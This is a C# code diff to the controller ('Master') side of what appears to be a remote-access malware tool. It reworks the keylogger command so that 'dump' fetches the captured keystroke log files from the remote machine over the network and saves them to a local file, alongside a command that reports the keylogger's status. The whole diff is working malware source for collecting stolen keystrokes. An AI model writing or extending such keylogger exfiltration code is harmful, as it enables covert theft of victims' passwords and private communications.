@@ -2,6 +2,8 @@
 using Master.Commands.Core;
 using System;
 using System.Collections.Generic;
+using System.IO;
+using Shared;
 
 namespace Master.Commands
 {
@@ -17,26 +19,60 @@ namespace Master.Commands
         {
             "start",
             "stop",
-            "dump",
+            "dump ?*:[localFileName]",
             "status"
         };
 
         public void Process(List<string> args)
         {
-            var result = MasterCommandsManager.networkManager.ReadLine();
-
             if (args[0] == "dump")
             {
-                if (result != "") Console.WriteLine(result);
+                GetLogFiles(args[1]);
             }
             else
             {
                 Console.Write("Keylogger status : [");
-                if (result == "on")
+                if (MasterCommandsManager.networkManager.ReadLine() == "on")
                     ColorTools.WriteInlineMessage("ON", ConsoleColor.Cyan);
                 else
                     ColorTools.WriteInlineMessage("OFF", ConsoleColor.Red);
                 Console.WriteLine("]");
+            }
+        }
+
+        void GetLogFiles(string filename)
+        {
+            var first = true;
+
+            while (true)
+            {
+                var data = GlobalCommandsManager.networkManager.ReadLine();
+                if (data == "{end}")
+                {
+                    if(first) ColorTools.WriteCommandMessage("No logs");
+                    return;
+                }
+                try
+                {
+                    var remoteFile = data;
+                    data = GlobalCommandsManager.networkManager.ReadLine();
+                    if (data.Length >= 2 && data.Substring(0, 2) == "KO")
+                    {
+                        ColorTools.WriteCommandError($"Couldn't get file '{remoteFile}'");
+                    }
+                    else
+                    {
+                        File.AppendAllText(filename, $"[{remoteFile}]\r\n{data}\r\n");
+                        ColorTools.WriteCommandSuccess($"Got log file '{remoteFile}'");
+                    }
+                }
+                catch (IOException)
+                {
+                    ColorTools.WriteCommandError($"Critical error: couldn't write log file '{filename}'. Aborting operation...");
+                    return;
+                }
+
+                first = false;
             }
         }
     }
